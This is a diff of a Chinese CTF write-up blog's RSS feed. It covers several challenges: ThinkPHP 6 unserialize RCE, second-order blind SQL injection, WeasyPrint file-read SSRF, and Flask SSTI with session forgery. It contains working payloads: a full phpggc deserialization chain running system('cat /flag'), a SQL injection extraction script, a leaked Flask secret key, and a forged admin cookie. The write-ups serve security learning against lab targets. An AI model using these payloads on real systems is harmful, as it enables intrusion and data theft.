-    func(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(l&lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;),x&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(l&lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;),y&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(l&lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;))
-
-func(l,&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;)
-&lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;**&lt;/span&gt;a):
-    &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;**&lt;/span&gt;a):
-        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(b[i][j],end&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;)
-    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;()
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;安洵杯-2019iamthinking&#34;&gt;[安洵杯 2019]iamthinking&lt;/h2&gt;
-&lt;p&gt;www.zip源码泄露，Thinkphp6.0，代码在app/controller/Index.php&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;?&lt;/span&gt;php
-&lt;span style=&#34;color:#ff79c6&#34;&gt;namespace&lt;/span&gt; app\controller;
-&lt;span style=&#34;color:#ff79c6&#34;&gt;use&lt;/span&gt; app\BaseController;
-
-&lt;span style=&#34;color:#ff79c6&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;Index&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;extends&lt;/span&gt; BaseController
-{
-    &lt;span style=&#34;color:#ff79c6&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;index&lt;/span&gt;()
-    {
+app &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; Flask(__name__)
+app&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;secret_key &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;amp;&amp;amp;_ej$tez)$_ik36n8d7o6mr#y&amp;#39;&lt;/span&gt;
+session_serializer &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; SecureCookieSessionInterface()&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;get_signing_serializer(app)
+@app&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;route(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;)
+&lt;span style=&#34;color:#ff79c6&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;index&lt;/span&gt;():
+    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(session_serializer&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;dumps(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt;))
+index()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ImFkbWluIg.YZ92Gw.m7Ax9nFV8ULTllJK2X31bEjyCuU&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>[FireshellCTF2020]URL_TO_PDF</title>
+        <link>https://proben1.github.io/2021/fireshellctf2020url_to_pdf/</link>
+        <pubDate>Mon, 22 Nov 2021 16:37:25 +0800</pubDate>
         
-        &lt;span style=&#34;color:#ff79c6&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;lt;img src=&amp;#39;../test.jpg&amp;#39;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;/&amp;gt;&amp;#34;&lt;/span&gt;;
-        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$paylaod&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;@&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;payload&amp;#39;&lt;/span&gt;];
-        &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(isset(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$paylaod&lt;/span&gt;))
-        {
-            &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; parse_url(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_SERVER&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;REQUEST_URI&amp;#39;&lt;/span&gt;]);
-            parse_str(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;query&amp;#39;&lt;/span&gt;],&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$query&lt;/span&gt;);
-            &lt;span style=&#34;color:#ff79c6&#34;&gt;foreach&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$query&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;as&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$value&lt;/span&gt;)
-            {
-                &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(preg_match(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;/^O/i&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$value&lt;/span&gt;))
-                {
-                    &lt;span style=&#34;color:#ff79c6&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;STOP HACKING&amp;#39;&lt;/span&gt;);
-                    &lt;span style=&#34;color:#ff79c6&#34;&gt;exit&lt;/span&gt;();
-                }
-            }
-            unserialize(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$paylaod&lt;/span&gt;);
-        }
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;parse_url()&lt;/p&gt;
-&lt;p&gt;1.//upload?如果是//，则被解析成host, 后面的内容如果有/,被解析出path，而不是query了&lt;/p&gt;
-&lt;p&gt;2.如果path部分为///，则解析错误&lt;/p&gt;
-&lt;p&gt;工具：https://github.com/wh1t3p1g/phpggc&lt;/p&gt;
-&lt;p&gt;使用：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;./phpggc -l
-./phpggc -u ThinkPHP/RCE2  &amp;#39;system(&amp;#34;cat /flag&amp;#34;);&amp;#39;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;payload:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;///public/?payload=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A13%3A%22%00%2A%00connection%22%3Bs%3A5%3A%22mysql%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3BN%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3BN%3Bs%3A18%3A%22%00think%5CModel%00force%22%3BN%3Bs%3A13%3A%22%00%2A%00connection%22%3BN%3Bs%3A9%3A%22%00%2A%00suffix%22%3BN%3Bs%3A21%3A%22%00think%5CModel%00relation%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A10%3A%22%00%2A%00visible%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3BC%3A32%3A%22Opis%5CClosure%5CSerializableClosure%22%3A200%3A%7Ba%3A5%3A%7Bs%3A3%3A%22use%22%3Ba%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A20%3A%22system%28%22cat+%2Fflag%22%29%3B%22%3B%7Ds%3A8%3A%22function%22%3Bs%3A38%3A%22function+%28%29+use+%28%24code%29+%7Beval%28%24code%29%3B%7D%22%3Bs%3A5%3A%22scope%22%3BN%3Bs%3A4%3A%22this%22%3BN%3Bs%3A4%3A%22self%22%3Bs%3A32%3A%220000000079ea1027000000003c8828b6%22%3B%7D%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A7%3A%22%00%2A%00type%22%3BN%3Bs%3A12%3A%22%00%2A%00withEvent%22%3BN%3B%7Ds%3A21%3A%22%00think%5CModel%00relation%22%3BN%3Bs%3A10%3A%22%00%2A%00visible%22%3BN%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3BN%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A7%3A%22%00%2A%00type%22%3BN%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3B%7D
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;网鼎杯2018unfinish&#34;&gt;[网鼎杯2018]Unfinish&lt;/h2&gt;
-&lt;p&gt;二次注入，注入点是在register.php传入的username中。&lt;/p&gt;
-&lt;p&gt;1.猜测语句&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;insert&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;table&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;values&lt;/span&gt; (&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;email&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;2.表名是猜的&lt;/p&gt;
-&lt;p&gt;过滤了information&lt;/p&gt;
-&lt;p&gt;mysql版本是&lt;strong&gt;5.5.64&lt;/strong&gt;，sys 库在&lt;strong&gt;MySQL5.6&lt;/strong&gt;或更高版本才有。&lt;/p&gt;
-&lt;p&gt;3.每次都需要注意换邮箱&lt;/p&gt;
-&lt;p&gt;4.过滤了逗号，不能闭合。&lt;/p&gt;
-&lt;p&gt;要用from for&lt;/p&gt;
-&lt;p&gt;5.+如果被识别成空格，可以用%2B。
-用异或也可以实现&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; requests
-&lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt; bs4 &lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; BeautifulSoup
-&lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; re
+        <guid>https://proben1.github.io/2021/fireshellctf2020url_to_pdf/</guid>
+        <description>&lt;h2 id=&#34;fireshellctf2020url-to-pdf&#34;&gt;[FireshellCTF2020]URL TO PDF&lt;/h2&gt;
+&lt;p&gt;由于刚刚有些无聊所以再开一道&lt;/p&gt;
+&lt;p&gt;开局一个输入框，url转pdf？没见过&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	&gt;
+	&lt;a href=&#34;https://pic.imgdb.cn/item/6240227e27f86abb2a973232.png&#34; &gt;
+		&lt;img src=&#34;https://pic.imgdb.cn/item/6240227e27f86abb2a973232.png&#34;
+			
+			
+			
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;弹出下载，但是没法打开，用010来看，可以看到html，猜测爬虫之类的，可以开个服务器看看请求&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;root@VM-8-15-debian:~# nc -lvp 10004
+listening on [any] 10004 ...
+117.21.200.166: inverse host lookup failed: Unknown host
+connect to [10.0.8.15] from (UNKNOWN) [117.21.200.166] 1519
+GET / HTTP/1.1
+Host: 82.157.174.226:10004
+User-Agent: WeasyPrint 51 (http://weasyprint.org/)
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close
 
-url &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;http://3facbb99-4fb4-44fa-8fae-fa28575f788a.node4.buuoj.cn:81/&amp;#39;&lt;/span&gt;
-a &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
-&lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;60&lt;/span&gt;):
-    email &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;eqwews1@131416024w&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;str&lt;/span&gt;(i)
-    &lt;span style=&#34;color:#6272a4&#34;&gt;#insert table values (&amp;#39;email&amp;#39;,&amp;#39;username&amp;#39;,&amp;#39;password&amp;#39;)&lt;/span&gt;
-    payload &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;0&amp;#39; + ascii(substr((select * from flag) from &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;str&lt;/span&gt;(i)&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34; for 1))+&amp;#39;0&amp;#34;&lt;/span&gt;
-    register &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;email&amp;#39;&lt;/span&gt;:email,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;:payload,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;}
-    login &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;email&amp;#39;&lt;/span&gt;:email,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;}
-    r1 &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;post(url&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;register.php&amp;#39;&lt;/span&gt;,data &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; register)
-    r2 &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;post(url&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;login.php&amp;#39;&lt;/span&gt;, data &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; login,allow_redirects&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;True&lt;/span&gt;)
-    soup &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; BeautifulSoup(r2&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;text,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;html.parser&amp;#39;&lt;/span&gt;)
-    a&lt;span style=&#34;color:#ff79c6&#34;&gt;+=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;chr&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(soup&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;span&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;string&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;strip()))
-    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(a)
-
-&lt;span style=&#34;color:#6272a4&#34;&gt;#print(soup.find_all(&amp;#39;span&amp;#39;))&lt;/span&gt;
-&lt;span style=&#34;color:#6272a4&#34;&gt;#print(re.findall(&amp;#34;.*?&amp;lt;/span&amp;gt;&amp;#34;,r2.text)[0].replace(&amp;#39;&amp;lt;/span&amp;gt;&amp;#39;,&amp;#39;&amp;#39;).strip(),end=&amp;#39;&amp;#39;) 不用bs4用re硬找&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;npuctf2020验证&#34;&gt;[NPUCTF2020]验证🐎&lt;/h2&gt;
-&lt;p&gt;js题，长知识了&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;WeasyPrint是啥？没见过&lt;/p&gt;
+&lt;p&gt;WeasyPrint 是一个 Python 的虚拟 HTML 和 CSS 渲染引擎，可以用来将网页转成 PDF 文档。旨在支持 Web 标准的打印。&lt;/p&gt;
+&lt;p&gt;WeasyPrint 会把所有它支持的东西 都请求一遍然后放在 PDF 里，这里出现了漏洞，在 &lt;code&gt;&amp;lt;link&amp;gt;&lt;/code&gt; 标签内 &lt;code&gt;href&lt;/code&gt; 加载 &lt;code&gt;file://&lt;/code&gt; 实现 SSRF + 任意文件读取&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Weasyprint (the library used here) allows including files into the PDF using &lt;code&gt;&amp;lt;link rel=attachment href=&amp;quot;PATH&amp;quot; /&amp;gt;&lt;/code&gt; in the HTML source for the PDF&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;blockquote&gt;
+&lt;p&gt;It’s a documented feature&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The information about weasyprint was leaked using a &lt;code&gt;background-image&lt;/code&gt; CSS property to load an attacker-controlled image&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The vendor and version (weasyprint 44) were in the HTTP headers&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;开了个docker，写个html&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
+&amp;lt;&lt;span style=&#34;color:#ff79c6&#34;&gt;html&lt;/span&gt;&amp;gt;
+&amp;lt;&lt;span style=&#34;color:#ff79c6&#34;&gt;head&lt;/span&gt;&amp;gt;
+&amp;lt;&lt;span style=&#34;color:#ff79c6&#34;&gt;title&lt;/span&gt;&amp;gt;Captain&amp;lt;/&lt;span style=&#34;color:#ff79c6&#34;&gt;title&lt;/span&gt;&amp;gt;
+&amp;lt;/&lt;span style=&#34;color:#ff79c6&#34;&gt;head&lt;/span&gt;&amp;gt;
+&amp;lt;&lt;span style=&#34;color:#ff79c6&#34;&gt;body&lt;/span&gt;&amp;gt;
+&amp;lt;&lt;span style=&#34;color:#ff79c6&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;rel&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;attachment&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;file:///flag&amp;#39;&lt;/span&gt;&amp;gt;
+&amp;lt;/&lt;span style=&#34;color:#ff79c6&#34;&gt;body&lt;/span&gt;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;heading&#34;&gt;&lt;/h2&gt;
+</description>
+        </item>
+        <item>
+        <title>[NPUCTF2020]验证🐎</title>
+        <link>https://proben1.github.io/2021/npuctf2020%E9%AA%8C%E8%AF%81/</link>
+        <pubDate>Mon, 22 Nov 2021 16:37:25 +0800</pubDate>
+        
+        <guid>https://proben1.github.io/2021/npuctf2020%E9%AA%8C%E8%AF%81/</guid>
+        <description>&lt;p&gt;js题，长知识了&lt;/p&gt;
 &lt;p&gt;F12，ctrl+U查源码&lt;/p&gt;
 &lt;p&gt;源码&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;const&lt;/span&gt; express &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; require(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;express&amp;#39;&lt;/span&gt;);
@@ -2126,36 +2301,20 @@ data &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; {&lt;span style=&#
 r &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;post(url, data&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;json&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;dumps(data), headers&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;headers)
 &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(r&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;text)
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;学js去了&lt;/p&gt;
-&lt;h2 id=&#34;fbctf2019event&#34;&gt;[FBCTF2019]Event&lt;/h2&gt;
-&lt;p&gt;flask&lt;/p&gt;
-&lt;p&gt;没想到在event_important有注入&lt;/p&gt;
-&lt;p&gt;猜它可能大概想这样&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;name &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; event_name
-address &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; event_address
-&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(event_important)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;event_name=1&amp;amp;event_address=1&amp;amp;event_important=__class__.__init__.__globals__[app].config
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;于是查到秘钥&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;amp;&amp;amp;_ej$tez)$_ik36n8d7o6mr#y&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;解密，出现的是字符串，不是json&lt;/p&gt;
-&lt;p&gt;加密&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt; flask &lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; Flask
-&lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt; flask.sessions &lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; SecureCookieSessionInterface
-
